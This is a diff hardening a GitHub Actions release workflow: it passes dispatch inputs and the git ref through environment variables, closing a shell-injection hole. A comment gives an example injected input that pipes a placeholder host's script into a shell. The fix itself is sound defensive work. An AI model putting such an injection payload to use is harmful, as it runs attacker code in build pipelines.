@@ -62,16 +62,24 @@ jobs:
         # build work, so a mistake costs seconds rather than a wasted run.
         # Dry runs skip all of it: they are meant to be cheap and frequent.
         if: ${{ inputs.dry_run == false }}
+        # Dispatch inputs and github.ref reach the script through `env:`, never
+        # through `${{ }}` interpolated into the shell. Only repo writers can
+        # dispatch this workflow, so the exposure is small, but interpolation
+        # splices attacker-chosen text into the script body itself: a
+        # confirm_version of `"; curl evil.sh | sh; #` would run. Via env the
+        # value is only ever data.
+        env:
+          VERSION: ${{ steps.read.outputs.version }}
+          CONFIRM_VERSION: ${{ inputs.confirm_version }}
+          GIT_REF: ${{ github.ref }}
         run: |
-          VERSION="${{ steps.read.outputs.version }}"
-
-          if [ "${{ github.ref }}" != "refs/heads/main" ]; then
-            echo "::error::Real releases must run from main, not ${{ github.ref }}." >&2
+          if [ "$GIT_REF" != "refs/heads/main" ]; then
+            echo "::error::Real releases must run from main, not $GIT_REF." >&2
             exit 1
           fi
 
-          if [ "${{ inputs.confirm_version }}" != "$VERSION" ]; then
-            echo "::error::confirm_version ('${{ inputs.confirm_version }}') does not match gradle.properties ('$VERSION'). Refusing to publish." >&2
+          if [ "$CONFIRM_VERSION" != "$VERSION" ]; then
+            echo "::error::confirm_version ('$CONFIRM_VERSION') does not match gradle.properties ('$VERSION'). Refusing to publish." >&2
             exit 1
           fi
 
@@ -156,10 +164,11 @@ jobs:
         if: ${{ inputs.dry_run == false }}
         env:
           GH_TOKEN: ${{ github.token }}
+          VERSION: ${{ needs.gate.outputs.version }}
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          TAG="v${{ needs.gate.outputs.version }}"
+          TAG="v$VERSION"
           git tag "$TAG"
           git push origin "$TAG"
           gh release create "$TAG" --generate-notes
